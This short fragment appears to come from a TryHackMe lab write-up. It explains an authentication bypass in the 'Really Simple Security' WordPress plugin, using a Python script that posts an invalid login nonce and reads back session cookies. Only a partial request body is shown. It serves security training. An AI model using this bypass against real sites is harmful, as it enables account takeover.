'''
TryHackMe - Bypass Really Simple Security | How to Exploit

Below is a simple Python script that sends a POST request to the vulnerable endpoint.
This script extracts and displays the cookies in response to authenticate the user.
...
data = {
    ...
    "login_nonce" : "invalid_nonce",  # Arbituary value
